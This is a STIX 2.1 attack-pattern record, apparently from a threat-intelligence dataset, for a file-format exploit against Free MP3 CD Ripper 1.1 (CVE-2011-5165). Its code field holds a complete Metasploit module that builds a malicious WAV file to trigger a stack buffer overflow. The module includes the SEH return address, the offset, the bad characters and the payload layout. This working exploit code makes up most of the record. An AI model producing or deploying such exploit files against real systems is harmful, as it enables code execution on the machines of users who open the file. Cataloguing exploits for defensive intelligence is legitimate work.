{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fe7470e2-2454-47fb-ba09-ab8fea82219a",
    "created": "2024-08-14T16:36:52.616676Z",
    "modified": "2024-08-14T16:36:52.61668Z",
    "name": "Free MP3 CD Ripper 1.1 WAV File Stack Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow found in Free MP3 CD Ripper 1.1.  The overflow is triggered when an unsuspecting user opens a malicious WAV file.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/free_mp3_ripper_wav.rb",
            "external_id": "free_mp3_ripper_wav.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5165"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Free MP3 CD Ripper 1.1 WAV File Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow found in Free MP3 CD\n        Ripper 1.1.  The overflow is triggered when an unsuspecting user opens a malicious\n        WAV file.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Richard Leahy',    # Initial discovery\n          'X-h4ck',           # msf module is based on his poc\n          'Tiago Henriques',  # msf module\n          'James Fitts <fitts.james[at]gmail.com>'       # clean ups\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-5165' ],\n          [ 'OSVDB', '63349' ],\n          [ 'EDB', '11975' ], #Initial disclosure\n          [ 'EDB', '17727' ] #This exploit is based on this poc\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n          'DisableNops' => 'True',\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3 EN',\n            {\n              'Ret' => 0x1001860b, # p/p/r in libFLAC.dll\n              'Offset' => 4116\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-08-27',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.wav']),\n      ])\n  end\n\n  def exploit\n\n    wav = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"inc ecx\").encode_string * 100\n    wav << payload.encoded\n    wav << rand_text_alpha_upper(target['Offset'] - (100 + payload.encoded.length))\n    wav << generate_seh_record(target.ret)\n    wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"inc ecx\").encode_string * 4\n    wav << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-4050\").encode_string\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(wav)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-27",
    "x_mitre_platforms": [
        "win'"
    ]
}